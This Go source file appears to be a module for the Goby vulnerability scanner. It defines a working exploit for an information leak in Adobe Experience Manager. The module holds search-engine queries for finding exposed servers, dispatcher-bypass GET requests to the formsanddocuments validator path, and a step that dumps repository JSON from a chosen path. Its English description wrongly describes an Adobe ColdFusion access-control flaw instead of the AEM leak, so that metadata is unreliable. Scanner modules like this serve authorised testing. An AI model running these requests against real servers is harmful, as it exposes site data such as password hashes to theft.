package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Adobe Experience Manager formsanddocuments.form.validator.html information leak",
    "Description": "<p>Adobe ColdFusion versions 2018u18 (and earlier), 2021u8 (and earlier), and 2023u2 (and earlier) are affected by an Improper Access Control vulnerability that could lead to the bypass of security features and patches for CVE-2023-29298. An attacker could exploit this vulnerability to access administrative CFM and CFC endpoints. No user interaction is required to exploit this issue.</p>",
    "Product": "Adobe-Experience-Manager",
    "Homepage": "https://www.adobe.com/marketing/experience-manager-sites/web-content-management.html",
    "DisclosureDate": "2020-10-14",
    "PostTime": "2024-03-08",
    "Author": "lidingke@baimaohui.net",
    "FofaQuery": "body=\"/libs/granite/core/content/login.html/j_security_check\" ||body=\"/etc.clientlibs/clientlibs/granite/\"||body=\"/libs/granite/core/content/login/clientlib.min.js\"||body=\"/etc/clientlibs/granite/typekit.js\"",
    "GobyQuery": "body=\"/libs/granite/core/content/login.html/j_security_check\" ||body=\"/etc.clientlibs/clientlibs/granite/\"||body=\"/libs/granite/core/content/login/clientlib.min.js\"||body=\"/etc/clientlibs/granite/typekit.js\"",
    "Level": "2",
    "Impact": "<p>Sensitive information leakage vulnerability may lead to the theft and misuse of users' personal identification information, financial information, health records and other sensitive data by hackers</p>",
    "Recommendation": "<p>1. Apply the latest official website patch <a href=\"https://www.adobe.com/marketing/experience-manager-sites/web-content-management.html\">https://www.adobe.com</a></p><p>2. Set up access policies through firewalls and other security devices to set up whitelist access</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "custom",
            "show": ""
        },
        {
            "name": "filePath",
            "type": "input",
            "value": "/home/....children.tidy...infinity..json",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "//content/dam/formsanddocuments.form.validator.html/home/....children.tidy...infinity..json",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "jcr:uuid",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "vulurl|lastbody|variable|{{{fixedhostinfo}}}//content/dam/formsanddocuments.form.validator.html/home/....children.tidy...infinity..json"
            ]
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/..;//content/dam/formsanddocuments.form.validator.html/home/....children.tidy...infinity..json",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "jcr:uuid",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "vulurl|lastbody|regex|{{{HostInfo}}}/..;//content/dam/formsanddocuments.form.validator.html/home/....children.tidy...infinity..json"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "//content/dam/formsanddocuments.form.validator.html{{{filePath}}}",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "jcr:uuid",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|([\\s\\S]*)"
            ]
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "Adobe Experience Manager formsanddocuments.form.validator.html 敏感信息泄露",
            "Product": "Adobe-Experience-Manager",
            "Description": "<p>Adobe Experience Manager（AEM）是一款由Adobe公司开发的企业级内容管理系统（CMS）。它提供了一个集成的平台，帮助组织管理他们的网站、移动应用、社交媒体等多渠道的数字内容，可在此端点发现可能的重要文件。搜索/抓取秘密，如散列密码（SHA）、内部电子邮件披露等</p>",
            "Recommendation": "<p>1. 打上最新官网的补丁&nbsp;<a href=\"https://www.adobe.com/marketing/experience-manager-sites/web-content-management.html\">https://www.adobe.com</a></p><p></p><p>2.通过防火墙等安全设备设置访问策略，设置白名单访问</p>",
            "Impact": "<p>敏感信息泄露漏洞可能导致用户的个人身份信息、财务信息、健康记录等敏感数据被黑客窃取和滥用</p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "Adobe Experience Manager formsanddocuments.form.validator.html information leak",
            "Product": "Adobe-Experience-Manager",
            "Description": "<p>Adobe ColdFusion versions 2018u18 (and earlier), 2021u8 (and earlier), and 2023u2 (and earlier) are affected by an Improper Access Control vulnerability that could lead to the bypass of security features and patches for CVE-2023-29298. An attacker could exploit this vulnerability to access administrative CFM and CFC endpoints. No user interaction is required to exploit this issue.<br></p>",
            "Recommendation": "<p>1. Apply the latest official website patch&nbsp;<a href=\"https://www.adobe.com/marketing/experience-manager-sites/web-content-management.html\">https://www.adobe.com</a><br></p><p>2. Set up access policies through firewalls and other security devices to set up whitelist access<br></p>",
            "Impact": "<p>Sensitive information leakage vulnerability may lead to the theft and misuse of users' personal identification information, financial information, health records and other sensitive data by hackers<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10934"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}